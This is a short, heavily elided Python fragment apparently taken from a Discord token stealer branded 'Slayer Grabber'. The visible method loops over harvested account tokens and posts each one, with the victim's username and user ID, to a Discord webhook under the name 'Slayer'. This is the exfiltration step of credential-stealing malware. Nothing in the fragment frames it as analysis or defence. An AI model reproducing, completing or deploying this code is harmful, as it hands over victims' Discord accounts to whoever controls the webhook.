...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed = Embed(title=f"{username} ({user_id}) (Slayer Grabber)", color=0x000000)
            ...
            self.webhook.send(embed=embed, username="Slayer", avatar_url="https://cdn.discordapp.com/attachments/1083291594511360060/1083652143489232896/Slayer.jpg")
